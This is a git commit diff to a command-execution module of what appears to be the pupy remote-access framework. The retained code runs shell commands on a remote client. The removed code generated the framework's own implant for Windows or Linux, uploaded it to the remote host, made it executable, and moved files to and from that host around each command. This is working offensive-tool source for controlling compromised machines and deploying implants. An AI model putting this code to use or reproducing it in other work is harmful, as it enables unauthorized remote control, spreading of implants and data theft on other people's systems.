895eb7b91153d86d3b3ef0609b4ee808434b4c3b
AlessandroZ <zanni.alessandro@gmail.com>
2018-10-03 17:14:09 +0200

    pexec - rm upload/download + fix when space in cmd

--- pupy/modules/pexec.py
+++ pupy/modules/pexec.py
@@ -1,23 +1,18 @@
 # -*- coding: utf-8 -*-
 
-import subprocess
-
 from pupylib.PupyModule import (
     config, PupyModule, PupyArgumentParser,
     REQUIRE_STREAM
 )
 
 import datetime
-import os
-import re
-import pupygen
-import tempfile
+import subprocess
 import threading
 
 from argparse import REMAINDER
-from rpyc.utils.classic import download, upload
 
 __class_name__="PExec"
+
 
 @config(cat="admin")
 class PExec(PupyModule):
@@ -25,9 +20,6 @@ class PExec(PupyModule):
 
     terminate_pipe = None
     terminated = False
-
-    updl = re.compile('\^([^\^]+)\^([<>])([^\^]+)\^')
-    # daemon = True
 
     dependencies = ["pupyutils.safepopen"]
     io = REQUIRE_STREAM
@@ -57,8 +49,7 @@ class PExec(PupyModule):
         cls.arg_parser.add_argument(
             'arguments',
             nargs=REMAINDER,
-            help='CMD args. You can use ^/local/path^[>|<]/remote/path^ '
-            'form to upload|download files before|after command'
+            help='CMD args'
         )
 
     def run(self, args):
@@ -67,80 +58,7 @@ class PExec(PupyModule):
             return
 
         cmdargs = args.arguments
-
-        to_upload = []
-        to_download = []
-
-        rexpandvars = self.client.remote('os.path', 'expandvars')
-        rexists = self.client.remote('os.path', 'exists')
-        rchmod = self.client.remote('os', 'chmod')
         safe_exec = self.client.remote('pupyutils.safepopen', 'safe_exec', False)
-
-        for i, arg in enumerate(cmdargs):
-            for local, direction, remote in self.updl.findall(arg):
-                if local == '$SELF$':
-                    platform = self.client.platform
-                    if platform not in ('windows', 'linux'):
-                        self.error('Couldn\'t use $SELF$ on platform {}'.format(platform))
-                    xlocal = '$SELF$'
-                else:
-                    xlocal = os.path.expandvars(local)
-
-                xremote = rexpandvars(remote)
-
-                if direction == '<':
-                    to_download.append((xremote, xlocal))
-                else:
-                    if xlocal == '$SELF$':
-                        mode = 0711
-                        to_upload.append((xlocal, xremote, mode))
-                    else:
-                        if not os.path.exists(xlocal):
-                            self.error('No local file {} found (scheduled for upload)'.format(
-                                xlocal))
-
-                        mode = os.stat(xlocal).st_mode
-                        to_upload.append((xlocal, xremote, mode))
-
-                arg = arg.replace('^'+local+'^'+direction+remote+'^', remote)
-
-            cmdargs[i] = arg
-
-        for local, remote, mode in to_upload:
-            if local == '$SELF$':
-                platform = self.client.platform
-                arch = ''
-                config = self.client.get_conf()
-
-                payload = b''
-                if self.client.is_proc_arch_64_bits():
-                    if platform == 'windows':
-                        payload = pupygen.get_edit_pupyx64_exe(config)
-                    else:
-                        payload = pupygen.get_edit_pupyx64_lin(config)
-
-                    arch = 'x64'
-                else:
-                    if platform == 'windows':
-                        payload = pupygen.get_edit_pupyx86_exe(config)
-                    else:
-                        payload = pupygen.get_edit_pupyx86_lin(config)
-
-                    arch = 'x86'
-
-                with tempfile.NamedTemporaryFile() as tmp:
-                    self.info('Store pupy/{}/{}/size={} to {}'.format(
-                        platform, arch, len(payload), tmp.name))
-                    tmp.write(payload)
-                    tmp.flush()
-                    self.info('Upload {} -> {}'.format(tmp.name, remote))
-                    upload(self.client.conn, tmp.name, remote)
-            else:
-                self.info('Upload {} -> {}'.format(local, remote))
-                upload(self.client.conn, local, remote)
-
-            rchmod(remote, mode)
-
         cmdenv = {
             'stderr': (None if args.n else subprocess.STDOUT),
             'universal_newlines': False,
@@ -160,7 +78,7 @@ class PExec(PupyModule):
                     'cmd.exe', '/c',
                 ] + cmdargs if self.client.is_windows() else [
                     '/bin/sh', '-c', ' '.join(
-                        '"'+x.replace('"','\"')+'"' for x in cmdargs
+                        '"'+x.replace('"', '\"')+'"' for x in cmdargs
                     )
                 ]
 
@@ -177,7 +95,7 @@ class PExec(PupyModule):
         self.terminate_pipe, get_returncode = safe_exec(
             None if args.N else on_read,
             close_event.set,
-            tuple(cmdargs), **cmdenv)
+            cmdargs, **cmdenv)
 
         if hasattr(self.job, 'id'):
             self.success('Started at {}): '.format(
@@ -186,19 +104,11 @@ class PExec(PupyModule):
         close_event.wait()
 
         retcode = get_returncode()
-
         if retcode == 0:
             self.success('Successful at {}: '.format(datetime.datetime.now()))
         else:
             self.error(
                 'Ret: {} at {}'.format(retcode, datetime.datetime.now()))
-
-        for remote, local in to_download:
-            if rexists(remote):
-                self.info('Download {} -> {}'.format(remote, local))
-                download(self.client.conn, remote, local)
-            else:
-                self.error('Remote file {} not exists (scheduled for download)'.format(remote))
 
     def interrupt(self):
         if not self.terminated and self.terminate_pipe:
